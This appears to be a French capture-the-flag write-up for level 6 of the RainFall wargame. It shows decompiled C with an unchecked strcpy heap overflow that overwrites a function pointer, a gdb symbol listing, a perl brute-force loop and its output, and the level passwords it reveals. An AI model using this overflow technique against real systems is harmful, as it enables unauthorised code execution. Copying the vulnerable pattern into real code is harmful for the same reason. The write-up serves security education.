# Level 6

pass : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

## Sources :

```c
#include <stdlib.h>

void	n() {
	system("/bin/cat /hom/user/level7/.pass");
}

void	m(char *str) {
	puts("Nope");
}

void	main(int ac, char **av) {
	char *str = malloc(64);  // 0x40
	void * (*ptr_function)(char *);
	ptr_function = malloc(4);
	ptr_function = &m;
	strcpy(str, av[1]);
	(*ptr_function)(str);
}
```

```gdb
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy@plt
0x08048350  malloc@plt
0x08048360  puts@plt
0x08048370  system@plt
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
```

## Recherche :

On va essayer de faire segfaut le programme jusqu'à ce que l'`EIP` soit remplacée par l'addresse de `n` (`0x08048454`)

On écrit un petite boucle :
```sh
for((i=64; i<80; i++)); do echo "index $i"; ./level6 `(perl -e 'print "A"x('$i')."\x54\x84\x04\x08"')` ;done
```

## Exploit :

```shell
level6@RainFall:~$ for((i=64; i<80; i++)); do echo "index $i"; ./level6 `(perl -e 'print "A"x('$i')."\x54\x84\x04\x08"')` ;done
index 64
Nope
index 65
Nope
index 66
Nope
index 67
Nope
index 68
Segmentation fault (core dumped)
index 69
Segmentation fault (core dumped)
index 70
Segmentation fault (core dumped)
index 71
Segmentation fault (core dumped)
index 72
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
index 73
Segmentation fault (core dumped)
index 74
Segmentation fault (core dumped)
index 75
Segmentation fault (core dumped)
index 76
Segmentation fault (core dumped)
index 77
Segmentation fault (core dumped)
index 78
Segmentation fault (core dumped)
index 79
Segmentation fault (core dumped)
```

L'`EIP` à bien été remplacé par notre valeur avec un offset de 72. Et on a trouvé le pass pour le level suivant : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
